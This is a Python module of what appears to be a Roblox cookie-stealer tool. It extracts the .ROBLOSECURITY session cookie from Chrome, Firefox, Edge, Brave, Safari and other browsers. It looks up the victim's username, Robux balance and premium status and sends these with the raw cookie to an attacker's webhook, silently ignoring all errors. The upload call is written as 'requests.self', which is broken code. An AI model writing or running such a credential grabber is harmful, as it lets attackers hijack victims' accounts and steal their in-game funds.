import requests
import browser_cookie3
from bin.config import Config
from bin.webhook import _WebhookX


class RobloxX:
    def __init__(self):
        self.web = _WebhookX().get_object()
        self.cc = Config()

    def UploadRobloxCookie(self, roblox_cookie):
        try:
            info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).json()

            json = {"embed": {"description": "Roblox Cookie Grabber:", "color": 13395456, "timestamp": "now", "author": {"name": self.cc.get_name(), "icon_url": self.cc.get_avatar()}, "footer": {"text": self.cc.get_footer(), "icon_url": self.cc.get_avatar()}, "fields": [{"name": "User ID:", "value": "`" + info["UserID"] + "`"}, {"name": "Username:", "value": "`" + info["UserName"] + "`"}, {"name": "Robux Balance:", "value": "`" + info["RobuxBalance"] + "`"}, {"name": "IsPremium:", "value": "`" + info["IsPremium"] + "`"}, {"name": "ROBLOSECURITY:", "value": "Roblox Cookie ```" + roblox_cookie + "```"}], "image": {"url": info["ThumbnailUrl"]}}}

            requests.self(self.web, json=json)
        except:
            pass

    def RobloxCookieGrabber(self):
        browsers = [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.librewolf, browser_cookie3.opera, browser_cookie3.edge, browser_cookie3.chromium, browser_cookie3.brave, browser_cookie3.vivaldi, browser_cookie3.safari]

        for browser in browsers:
            try:
                cookies = browser(domain_name="roblox.com")
                cookies = str(cookies)
                cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
                self.UploadRobloxCookie(cookie)
            except:
                pass

    def run(self):
        self.RobloxCookieGrabber()
